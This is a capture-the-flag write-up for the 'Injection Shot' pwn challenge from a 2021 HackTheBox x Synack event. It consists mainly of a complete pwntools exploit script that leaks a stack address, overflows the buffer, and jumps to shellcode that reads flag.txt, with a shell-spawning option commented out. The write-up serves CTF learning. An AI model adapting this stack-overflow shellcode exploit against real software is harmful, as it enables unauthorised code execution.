---
name: Injection Shot (2021)
event: HackTheBox x Synack RedTeamFive CTF 2021
category: Pwn
description: Writeup for Injection Shot (pwn) - HackTheBox x Synack RedTeamFive CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Injection Shot

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/Kqu3qpYMml8/0.jpg)](https://youtu.be/Kqu3qpYMml8?t=15s "HackTheBox x Synack RedTeamFive 2021: Injection Shot")

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p = process(exe)
    p.sendlineafter('>', '1')
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
breakrva 0x934
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './injection_shot'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

# Get the stack address
io.sendlineafter('>', '1')
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info("leaked stack_addr: %#x", stack_addr)

# Build shellcode (cat flag.txt or spawn shell)
# shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.cat('flag.txt'))

# Pad shellcode with NOPs until we get to return address
padding = asm('nop') * offset

# Build the payload
payload = flat([
    padding,
    stack_addr + offset + 8,
    shellcode
])

io.sendlineafter('>', payload)  # Exploit

# Get our flag!
io.recvline()
flag = io.recv()
success(flag)

# Or, spawn a shell
# io.interactive()
```
{% endcode %}
